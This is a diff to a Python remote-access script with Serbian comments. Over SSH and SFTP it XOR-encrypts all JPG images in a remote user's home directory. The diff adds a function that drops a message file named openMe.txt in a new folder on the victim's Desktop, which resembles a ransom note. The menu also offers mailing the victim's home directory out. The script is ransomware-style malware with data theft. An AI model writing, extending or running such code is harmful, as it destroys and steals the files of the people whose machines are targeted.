@@ -154,8 +154,8 @@ def criptImage(files, client, user, key, path=""):
             sftp_client = client.open_sftp()
             path1 = '/home/' + user + '/' + path + file
             path1 = path1.strip()
-            # Otvaramo fajl za citanje
-            remote_file = sftp_client.open(path1, mode='r')
+            # Otvaramo fajl za citanje u bajtovima(b)
+            remote_file = sftp_client.open(path1, mode='rb')
             image = remote_file.read()
             remote_file.close()
 
@@ -166,12 +166,19 @@ def criptImage(files, client, user, key, path=""):
             for index, values in enumerate(image):
                 image[index] = values ^ key
 
-            # Otvaramo fajl i pisemo u njega
-            remote_file = sftp_client.open(path1, mode='w')
+            # Otvaramo fajl i pisemo u njega u bajtovima(b)
+            remote_file = sftp_client.open(path1, mode='wb')
             remote_file.write(image)
 
             remote_file.close()
 
+def writeMessage(text, client):
+    client.exec_command(f"cd ~/Desktop; mkdir openMe")
+    client.exec_command(f"cd ~/Desktop/openMe; touch openMe.txt")
+    sftp_client = client.open_sftp()
+    remote_file = sftp_client.open("Desktop/openMe/openMe.txt", mode = 'w')
+    remote_file.write(text)
+    remote_file.close()
 
 # __name__ proverava da li je ovo glavn skripta ili importovana, ako pokrecemo direktno ovu skriptu __name__ ce biti main a inace ce biti recimo __import__
 if __name__ == "__main__":
@@ -250,8 +257,7 @@ if __name__ == "__main__":
 
         # Stdout u listu
 
-        tipKomande = input(
-            "Za slanje home direktorijuma na mejl unesite komandu 'mail' a za kriptovanje slike 'cript' : ")
+        tipKomande = input("1.Slanje maila - mail\n2.Kriptovanje svih jpgova - crypt\n3.Pravljenje novih datoteka - write\nKomanda: ")
 
         if (tipKomande == "mail"):
 
@@ -262,6 +268,11 @@ if __name__ == "__main__":
             path = ""
             criptImage(stdout, client, user, key, path)
             print("Enkripcija je uspesna")
+
+        elif (tipKomande == "write"):
+            text = input("Unesite poruku koju zelite da upisete: ")
+            writeMessage(text, client)
+            print("Ispis poruke uspesan")
 
         client.close()
 
